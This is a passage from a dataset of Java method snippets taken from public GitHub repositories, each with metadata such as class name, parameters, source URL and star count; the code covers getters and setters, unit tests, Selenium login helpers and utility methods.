"throws": null, "modifiers": ["public"], "return_type": "BigDecimal", "snippet": "\tpublic BigDecimal getNoCashCouponFee() {\n\t\treturn noCashCouponFee;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59673, "method_name": "setCashCouponFee", "class_name": "OrderDO", "params": ["BigDecimal"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setCashCouponFee(BigDecimal cashCouponFee) {\n\t\tthis.cashCouponFee = cashCouponFee;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59674, "method_name": "getCashCouponFee", "class_name": "OrderDO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "BigDecimal", "snippet": "\tpublic BigDecimal getCashCouponFee() {\n\t\treturn cashCouponFee;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59675, "method_name": "setCashFee", "class_name": "OrderDO", "params": ["BigDecimal"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setCashFee(BigDecimal cashFee) {\n\t\tthis.cashFee = cashFee;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59676, "method_name": "getCashFee", "class_name": "OrderDO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "BigDecimal", "snippet": "\tpublic BigDecimal getCashFee() {\n\t\treturn cashFee;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59677, "method_name": "setSign", "class_name": "OrderDO", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setSign(String sign) {\n\t\tthis.sign = sign;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59678, "method_name": "getSign", "class_name": "OrderDO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getSign() {\n\t\treturn sign;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59679, "method_name": "setOptions", "class_name": "OrderDO", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setOptions(String options) {\n\t\tthis.options = options;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59680, "method_name": "getOptions", "class_name": "OrderDO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getOptions() {\n\t\treturn options;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59681, "method_name": "setCreateTime", "class_name": "OrderDO", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setCreateTime(Date createTime) {\n\t\tthis.createTime = createTime;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59682, "method_name": "getCreateTime", "class_name": "OrderDO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Date", "snippet": "\tpublic Date getCreateTime() {\n\t\treturn createTime;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59683, "method_name": "setPushTime", "class_name": "OrderDO", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setPushTime(Date pushTime) {\n\t\tthis.pushTime = pushTime;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59684, "method_name": "getPushTime", "class_name": "OrderDO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Date", "snippet": "\tpublic Date getPushTime() {\n\t\treturn pushTime;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59685, "method_name": "setPushIp", "class_name": "OrderDO", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setPushIp(String pushIp) {\n\t\tthis.pushIp = pushIp;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59686, "method_name": "getPushIp", "class_name": "OrderDO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getPushIp() {\n\t\treturn pushIp;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59687, "method_name": "setMchtId", "class_name": "OrderDO", "params": ["BigDecimal"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setMchtId(BigDecimal mchtId) {\n\t\tthis.mchtId = mchtId;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59688, "method_name": "getMchtId", "class_name": "OrderDO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "BigDecimal", "snippet": "\tpublic BigDecimal getMchtId() {\n\t\treturn mchtId;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59689, "method_name": "setSn", "class_name": "OrderDO", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setSn(String sn) {\n\t\tthis.sn = sn;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59690, "method_name": "getSn", "class_name": "OrderDO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getSn() {\n\t\treturn sn;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59691, "method_name": "create", "class_name": "OrdersDataFactory", "params": [], "throws": null, "modifiers": ["public"], "return_type": "DataSource", "snippet": "    public DataSource create() {\n\n        latestSource = new OrdersDataSource();\n        sourceLiveData.postValue(latestSource);\n        return latestSource;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Lists/OrderHistoryPaging/ViewModel/OrdersDataFactory.java", "stars": "10", "class_props": {"extends": "DataSource", "implements": null, "modifiers": ["public"]}}, {"id": 59692, "method_name": "getSourceLiveData", "class_name": "OrdersDataFactory", "params": [], "throws": null, "modifiers": ["public"], "return_type": "MutableLiveData<OrdersDataSource>", "snippet": "    public MutableLiveData<OrdersDataSource> getSourceLiveData() {\n        return sourceLiveData;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Lists/OrderHistoryPaging/ViewModel/OrdersDataFactory.java", "stars": "10", "class_props": {"extends": "DataSource", "implements": null, "modifiers": ["public"]}}, {"id": 59693, "method_name": "main", "class_name": "SbMethods", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) {\n\t\t// charAt(), indexOf(), length(), substring()\n\t\t// These methods work exactly the same as in the String class\n\t\t\n\t\tStringBuilder day = new StringBuilder(\"Thursday\");\n\t\tchar ch = day.charAt(2);\n\t\tSystem.out.println(ch); // u\n\t\t\n\t\tint index = day.indexOf(\"d\");\n\t\tSystem.out.println(index);\n\t\t\n\t\tSystem.out.println(day.length());\n\t\t\n\t\t// substring() method will return String\n\t\tString subStr = day.substring(0, 4);\n\t\tSystem.out.println(subStr);\n\t\t\n\t\tSystem.out.println(\"-------------------\");\n\t\t// creating empty stringBuilder\n\t\tStringBuilder sb = new StringBuilder();\n\t\t// sb = \"wooden spoon\"; will not work\n\t\tsb.append(\"wooden spoon\");\n\t\t\n\t\t// method chaining\n\t\tsb.append(\"display\").append(\"settings\").append(\"apple\");\n\t\tSystem.out.println(sb); // wooden spoondisplay\n\t\t\n\t\tStringBuilder sb1 = sb.append(\"orange\");\t\t\n\t\t//sb.append(\"banana\").substring(0,2);\n\t\t\n\t\tSystem.out.println(\"-------------------\");\n\t\t// insert() method add characters to StringBuider at the requested index\n\t\t//                                     0123456\n\t\tStringBuilder sb2 = new StringBuilder(\"animals\");\n\t\tsb2.insert(7, \"-\"); \n\t\tSystem.out.println(sb2);\n\t\t\n\t\tsb2.insert(3, \"-\");\n\t\tSystem.out.println(sb2);\n\t\t\n\t\tsb2.insert(0, \"-\");     //  0123456789\n\t\tSystem.out.println(sb2); // -ani-mals-\n\t\t\n\t\tsb2.insert(8, \" i\");\n\t\tSystem.out.println(sb2); // \n\t\t\n\t\tString str = \" apple\";\n\t\tsb2.insert(12, str);\n\t\tSystem.out.println(sb2);\n\t\t\n\t\t//                                     0123456\n\t\tStringBuilder sb3 = new StringBuilder(\"John programmer\");\n\t\t// can you use instert method that sb3 value will be \"John is programmer\"\n\t\tsb3.insert(4, \" is\");\n\t\tSystem.out.println(sb3); //John is programmer\n\t\tSystem.out.println(\"--------------\");\n\t\t\n\t\t// delete(int start, int end) and deleteCharAt(int index)\n\t\t// delete() removes characters based on start and end indexes\n\t\t// deleteCharAt() remove single character based its index\n\t\t\n\t\t//                                     012345\n\t\tStringBuilder sb4 = new StringBuilder(\"abcdef\");\n\t\tsb4.delete(1, 3);         //0123\n\t\tSystem.out.println(sb4); // adef\n\t\t\n\t\tsb4.delete(1, 2); //aef\n\t\tSystem.out.println(sb4);\n\t\t\n\t\tStringBuilder sb5 = new StringBuilder(\"abcdefghijklmnopqrstuvwxyz\");\n\t\t// TODO\n\t\t// can you get first and last characters using delete method -> \"az\"\n\t\tsb5.delete(1, sb5.length() - 1);\n\t\tSystem.out.println(sb5); // az\n\t\t\n\t\tStringBuilder sb6 = new StringBuilder(\"wooden spoon\");\n\t\t//                      01234\n\t\tsb6.deleteCharAt(0); // ooden spoon\n\t\tSystem.out.println(sb6);\n\t\tsb6.deleteCharAt(4);\n\t\tSystem.out.println(sb6);\n\t\t\n\t\tSystem.out.println(\"-------------------\");\n\t\tStringBuilder sb7 = new StringBuilder(\"John Doe\");\n\t\tSystem.out.println(sb7);\n\t\tsb7.reverse();\n\t\tSystem.out.println(sb7);\n\t\t\n\t\tString str1 = sb7.toString();\n\t\t\n\t\tString name = \"John Doe 2\";\n\t\tStringBuilder sbName = new StringBuilder(name);\n\t\t\n\t}", "url": "https://raw.githubusercontent.com/Suranchiyev/java-sdet-2020/master/src/day17/SbMethods.java", "stars": "21", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59694, "method_name": "setUp", "class_name": "DistributionMasqueUIMapperTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void setUp() {\n        distributionMasqueUIMapper = new DistributionMasqueUIMapper(ClockFixture.clock(), hashGenerator);\n    }", "url": "https://raw.githubusercontent.com/LAB-MI/remise-masques-covid-19/master/src/test/java/fr/gouv/interieur/dmgp/remettant/application/ui/data/DistributionMasqueUIMapperTest.java", "stars": "5", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 59695, "method_name": "toDistributionMasques_devrait_retourner_une_liste_de_DistributionMasque_a_partir_d_une_DistributionMasqueUI", "class_name": "DistributionMasqueUIMapperTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void toDistributionMasques_devrait_retourner_une_liste_de_DistributionMasque_a_partir_d_une_DistributionMasqueUI() {\n        // Given\n        IdentiteDemandeurUI identiteDemandeur = IdentiteDemandeurUIFixture.aIdentiteDemandeurUI();\n        String hashIdentite = identiteDemandeur.getHashIdentite();\n        DistributionMasqueUI distributionMasqueUI = DistributionMasqueUI.builder()\n                .identiteDemandeur(identiteDemandeur)\n                .nbMasquesAdulteUsageUnique(40)\n                .nbMasquesAdulteReutilisable(4)\n                .nbMasquesEnfantUsageUnique(12)\n                .nbMasquesEnfantReutilisable(2)\n                .build();\n        String hashDemandeur = \"f7e40706eceac692d8f82fabeb24b35a3d8b93e9e971d63afed99566152bce1c\";\n        when(hashGenerator.hasherAvecPepper(hashIdentite)).thenReturn(hashDemandeur);\n\n        // When\n        List<DistributionMasque> distributionMasques = distributionMasqueUIMapper.toDistributionMasques(distributionMasqueUI, CODE_POSTAL, TYPE_REMETTANT.name());\n\n        // Then\n        assertThat(distributionMasques.size()).isEqualTo(4);\n        DistributionMasque distributionMasqueAdulteUsageUnique = distributionMasques.get(0);\n        assertThat(distributionMasqueAdulteUsageUnique.getHashDemandeur()).isEqualTo(hashDemandeur);\n        assertThat(distributionMasqueAdulteUsageUnique.getDateDistribution()).isEqualTo(ClockFixture.now());\n        assertThat(distributionMasqueAdulteUsageUnique.getNbMasques()).isEqualTo(40);\n        assertThat(distributionMasqueAdulteUsageUnique.getTypeMasque()).isEqualTo(ADULTE_USAGE_UNIQUE);\n        assertThat(distributionMasqueAdulteUsageUnique.getNbPersonnes()).isEqualTo(identiteDemandeur.getNombreMineurs() + 1);\n        DistributionMasque distributionMasqueAdulteReutilisable = distributionMasques.get(1);\n        assertThat(distributionMasqueAdulteReutilisable.getHashDemandeur()).isEqualTo(hashDemandeur);\n        assertThat(distributionMasqueAdulteReutilisable.getDateDistribution()).isEqualTo(ClockFixture.now());\n        assertThat(distributionMasqueAdulteReutilisable.getNbMasques()).isEqualTo(4);\n        assertThat(distributionMasqueAdulteReutilisable.getTypeMasque()).isEqualTo(ADULTE_REUTILISABLE);\n        assertThat(distributionMasqueAdulteReutilisable.getNbPersonnes()).isEqualTo(identiteDemandeur.getNombreMineurs() + 1);\n        DistributionMasque distributionMasqueEnfantUsageUnique = distributionMasques.get(2);\n        assertThat(distributionMasqueEnfantUsageUnique.getHashDemandeur()).isEqualTo(hashDemandeur);\n        assertThat(distributionMasqueEnfantUsageUnique.getDateDistribution()).isEqualTo(ClockFixture.now());\n        assertThat(distributionMasqueEnfantUsageUnique.getNbMasques()).isEqualTo(12);\n        assertThat(distributionMasqueEnfantUsageUnique.getTypeMasque()).isEqualTo(ENFANT_USAGE_UNIQUE);\n        assertThat(distributionMasqueEnfantUsageUnique.getNbPersonnes()).isEqualTo(identiteDemandeur.getNombreMineurs() + 1);\n        DistributionMasque distributionMasqueEnfantReutilisable = distributionMasques.get(3);\n        assertThat(distributionMasqueEnfantReutilisable.getHashDemandeur()).isEqualTo(hashDemandeur);\n        assertThat(distributionMasqueEnfantReutilisable.getDateDistribution()).isEqualTo(ClockFixture.now());\n        assertThat(distributionMasqueEnfantReutilisable.getNbMasques()).isEqualTo(2);\n        assertThat(distributionMasqueEnfantReutilisable.getTypeMasque()).isEqualTo(ENFANT_REUTILISABLE);\n        assertThat(distributionMasqueEnfantReutilisable.getNbPersonnes()).isEqualTo(identiteDemandeur.getNombreMineurs() + 1);\n    }", "url": "https://raw.githubusercontent.com/LAB-MI/remise-masques-covid-19/master/src/test/java/fr/gouv/interieur/dmgp/remettant/application/ui/data/DistributionMasqueUIMapperTest.java", "stars": "5", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 59696, "method_name": "toDistributionMasques_devrait_filtrer_les_distributions_dont_le_nombre_de_masques_est_egal_a_zero", "class_name": "DistributionMasqueUIMapperTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void toDistributionMasques_devrait_filtrer_les_distributions_dont_le_nombre_de_masques_est_egal_a_zero() {\n        // Given\n        IdentiteDemandeurUI identiteDemandeur = IdentiteDemandeurUIFixture.aIdentiteDemandeurUI();\n        String hashIdentite = identiteDemandeur.getHashIdentite();\n        DistributionMasqueUI distributionMasqueUI = DistributionMasqueUI.builder()\n                .identiteDemandeur(identiteDemandeur)\n                .nbMasquesAdulteUsageUnique(0)\n                .nbMasquesAdulteReutilisable(0)\n                .build();\n        String hashDemandeur = \"f7e40706eceac692d8f82fabeb24b35a3d8b93e9e971d63afed99566152bce1c\";\n        when(hashGenerator.hasherAvecPepper(hashIdentite)).thenReturn(hashDemandeur);\n\n        // When\n        List<DistributionMasque> distributionMasques = distributionMasqueUIMapper.toDistributionMasques(distributionMasqueUI, CODE_POSTAL, TYPE_REMETTANT.name());\n\n        // Then\n        assertThat(distributionMasques).isEmpty();\n    }", "url": "https://raw.githubusercontent.com/LAB-MI/remise-masques-covid-19/master/src/test/java/fr/gouv/interieur/dmgp/remettant/application/ui/data/DistributionMasqueUIMapperTest.java", "stars": "5", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 59697, "method_name": "toDistributionMasques_devrait_filtrer_les_distributions_dont_le_nombre_de_masques_est_null", "class_name": "DistributionMasqueUIMapperTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void toDistributionMasques_devrait_filtrer_les_distributions_dont_le_nombre_de_masques_est_null() {\n        // Given\n        IdentiteDemandeurUI identiteDemandeur = IdentiteDemandeurUIFixture.aIdentiteDemandeurUI();\n        String hashIdentite = identiteDemandeur.getHashIdentite();\n        DistributionMasqueUI distributionMasqueUI = DistributionMasqueUI.builder()\n                .identiteDemandeur(identiteDemandeur)\n                .nbMasquesAdulteUsageUnique(null)\n                .nbMasquesAdulteReutilisable(null)\n                .build();\n        String hashDemandeur = \"f7e40706eceac692d8f82fabeb24b35a3d8b93e9e971d63afed99566152bce1c\";\n        when(hashGenerator.hasherAvecPepper(hashIdentite)).thenReturn(hashDemandeur);\n\n        // When\n        List<DistributionMasque> distributionMasques = distributionMasqueUIMapper.toDistributionMasques(distributionMasqueUI, CODE_POSTAL, TYPE_REMETTANT.name());\n\n        // Then\n        assertThat(distributionMasques).isEmpty();\n    }", "url": "https://raw.githubusercontent.com/LAB-MI/remise-masques-covid-19/master/src/test/java/fr/gouv/interieur/dmgp/remettant/application/ui/data/DistributionMasqueUIMapperTest.java", "stars": "5", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 59698, "method_name": "toDistributionMasques_devrait_mettre_le_mode_de_saisie_et_le_type_remettant_a_null_quand_ils_sont_vides", "class_name": "DistributionMasqueUIMapperTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void toDistributionMasques_devrait_mettre_le_mode_de_saisie_et_le_type_remettant_a_null_quand_ils_sont_vides() {\n        // Given\n        IdentiteDemandeurUI identiteDemandeur = IdentiteDemandeurUIFixture.aIdentiteDemandeurUI();\n        identiteDemandeur.setModeSaisie(\"\");\n        String hashIdentite = identiteDemandeur.getHashIdentite();\n        DistributionMasqueUI distributionMasqueUI = DistributionMasqueUI.builder()\n                .identiteDemandeur(identiteDemandeur)\n                .nbMasquesAdulteUsageUnique(40)\n                .nbMasquesAdulteReutilisable(4)\n                .build();\n        String hashDemandeur = \"f7e40706eceac692d8f82fabeb24b35a3d8b93e9e971d63afed99566152bce1c\";\n        when(hashGenerator.hasherAvecPepper(hashIdentite)).thenReturn(hashDemandeur);\n\n        // When\n        List<DistributionMasque> distributionMasques = distributionMasqueUIMapper.toDistributionMasques(distributionMasqueUI, CODE_POSTAL, null);\n\n        // Then\n        assertThat(distributionMasques.get(0).getModeSaisie()).isNull();\n        assertThat(distributionMasques.get(0).getTypeRemettant()).isNull();\n    }", "url": "https://raw.githubusercontent.com/LAB-MI/remise-masques-covid-19/master/src/test/java/fr/gouv/interieur/dmgp/remettant/application/ui/data/DistributionMasqueUIMapperTest.java", "stars": "5", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 59699, "method_name": "setUp", "class_name": "OgnlStaticTest", "params": [], "throws": ["Exception"], "modifiers": ["static"], "return_type": "void", "snippet": "  static void setUp() throws Exception {\n    // create a SqlSessionFactory\n    try (Reader reader = Resources.getResourceAsReader(\"org/apache/ibatis/submitted/ognlstatic/mybatis-config.xml\")) {\n      sqlSessionFactory = new SqlSessionFactoryBuilder().build(reader);\n    }\n\n    // populate in-memory database\n    BaseDataTest.runScript(sqlSessionFactory.getConfiguration().getEnvironment().getDataSource(),\n            \"org/apache/ibatis/submitted/ognlstatic/CreateDB.sql\");\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/ognlstatic/OgnlStaticTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 59700, "method_name": "shouldGetAUserStatic", "class_name": "OgnlStaticTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldGetAUserStatic() {\n    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n      Mapper mapper = sqlSession.getMapper(Mapper.class);\n      User user = mapper.getUserStatic(1);\n      Assertions.assertNotNull(user);\n      Assertions.assertEquals(\"User1\", user.getName());\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/ognlstatic/OgnlStaticTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 59701, "method_name": "shouldGetAUserWithIfNode", "class_name": "OgnlStaticTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldGetAUserWithIfNode() {\n    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n      Mapper mapper = sqlSession.getMapper(Mapper.class);\n      User user = mapper.getUserIfNode(\"User1\");\n      Assertions.assertEquals(\"User1\", user.getName());\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/ognlstatic/OgnlStaticTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 59702, "method_name": "getWarningMessageText", "class_name": "LoginPage", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getWarningMessageText() {\n        return warningMessage.getText();\n    }", "url": "https://raw.githubusercontent.com/CybertekSchool/Fall2019OnlineCucumberSelenium/master/src/test/java/com/vytrack/pages/LoginPage.java", "stars": "26", "class_props": {"extends": "AbstractPageBase", "implements": null, "modifiers": ["public"]}}, {"id": 59703, "method_name": "login", "class_name": "LoginPage", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void login(String usernameValue, String passwordValue) {\n        username.sendKeys(usernameValue);\n        password.sendKeys(passwordValue, Keys.ENTER);\n        BrowserUtilities.waitForPageToLoad(10);\n        BrowserUtilities.wait(3);\n    }", "url": "https://raw.githubusercontent.com/CybertekSchool/Fall2019OnlineCucumberSelenium/master/src/test/java/com/vytrack/pages/LoginPage.java", "stars": "26", "class_props": {"extends": "AbstractPageBase", "implements": null, "modifiers": ["public"]}}, {"id": 59704, "method_name": "login", "class_name": "LoginPage", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void login() {\n        username.sendKeys(ConfigurationReader.getProperty(\"store_manager\"));\n        password.sendKeys(ConfigurationReader.getProperty(\"password\"), Keys.ENTER);\n        BrowserUtilities.waitForPageToLoad(10);\n        BrowserUtilities.wait(3);\n    }", "url": "https://raw.githubusercontent.com/CybertekSchool/Fall2019OnlineCucumberSelenium/master/src/test/java/com/vytrack/pages/LoginPage.java", "stars": "26", "class_props": {"extends": "AbstractPageBase", "implements": null, "modifiers": ["public"]}}, {"id": 59705, "method_name": "login", "class_name": "LoginPage", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void login(String role){\n        String userName = \"\";\n        if (role.equalsIgnoreCase(\"driver\")){\n            userName = \"user15\";\n        }else if (role.equalsIgnoreCase(\"sales manager\")){\n            userName = \"salesmanager110\";\n        }else if (role.equalsIgnoreCase(\"store manager\")){\n            userName = \"storemanager85\";\n        }else {\n            throw new RuntimeException(\"Invalid role!\");\n        }\n        System.out.println(\"Login as \"+role);\n        login(userName, \"UserUser123\");\n    }", "url": "https://raw.githubusercontent.com/CybertekSchool/Fall2019OnlineCucumberSelenium/master/src/test/java/com/vytrack/pages/LoginPage.java", "stars": "26", "class_props": {"extends": "AbstractPageBase", "implements": null, "modifiers": ["public"]}}, {"id": 59706, "method_name": "cast", "class_name": "NumberTypeConversion", "params": ["Class<?>", "Type", "Object"], "throws": null, "modifiers": ["protected"], "return_type": "Object", "snippet": "    protected Object cast(Class<?> target, Type[] neededGenerics, Object rawVal) {\n\n        Number value = (Number) rawVal;\n        // Wrapper classes are evil!\n        if (target.equals(Number.class)) {\n            return value;\n        } else if (target.equals(int.class) || target.equals(Integer.class)) {\n            if (value instanceof Integer) {\n                return value;\n            } else {\n                return value.intValue();\n            }\n        } else if (target.equals(byte.class) || target.equals(Byte.class)) {\n            if (value instanceof Byte) {\n                return value;\n            } else {\n                return value.byteValue();\n            }\n        } else if (target.equals(long.class) || target.equals(Long.class)) {\n            if (value instanceof Long) {\n                return value;\n            } else {\n                return value.longValue();\n            }\n        } else if (target.equals(double.class) || target.equals(Double.class)) {\n            if (value instanceof Double) {\n                return value;\n            } else {\n                return value.doubleValue();\n            }\n        } else if (target.equals(float.class) || target.equals(Float.class)) {\n            if (value instanceof Float) {\n                return value;\n            } else {\n                return value.floatValue();\n            }\n        } else if (target.equals(short.class) || target.equals(Short.class)) {\n            if (value instanceof Short) {\n                return value;\n            } else {\n                return value.shortValue();\n            }\n        }\n        return null;\n    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slib/config/typeconversions/NumberTypeConversion.java", "stars": "3", "class_props": {"extends": "TypeConversion", "implements": null, "modifiers": ["public"]}}, {"id": 59707, "method_name": "isApplicable", "class_name": "NumberTypeConversion", "params": ["Class<?>", "Object"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isApplicable(Class<?> target, Object value) {\n\n        return (target.isPrimitive() || Number.class.isAssignableFrom(target))\n                && !boolean.class.isAssignableFrom(target);\n    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slib/config/typeconversions/NumberTypeConversion.java", "stars": "3", "class_props": {"extends": "TypeConversion", "implements": null, "modifiers": ["public"]}}, {"id": 59708, "method_name": "getParametersRequired", "class_name": "NumberTypeConversion", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getParametersRequired() {\n\n        return 0;\n    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slib/config/typeconversions/NumberTypeConversion.java", "stars": "3", "class_props": {"extends": "TypeConversion", "implements": null, "modifiers": ["public"]}}, {"id": 59709, "method_name": "getInstance", "class_name": "RegisterA", "params": [], "throws": null, "modifiers": ["synchronized", "public", "static"], "return_type": "RegisterA", "snippet": "    public static synchronized RegisterA getInstance() {\n        if (instance == null) {\n            instance = new RegisterA();\n        }\n        return instance;\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/assembler/RegisterA.java", "stars": "4", "class_props": {"extends": "Register", "implements": null, "modifiers": ["public"]}}, {"id": 59710, "method_name": "canSelect", "class_name": "MapOverlayEspionageMission", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean canSelect(int catNum) {\n        return (mission.inCategory(TechCategory.id(catNum)) != null);\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/overlay/MapOverlayEspionageMission.java", "stars": "74", "class_props": {"extends": "MapOverlay", "implements": null, "modifiers": ["public"]}}, {"id": 59711, "method_name": "espionageCategorySelected", "class_name": "MapOverlayEspionageMission", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void espionageCategorySelected() {\n        drawSprites = 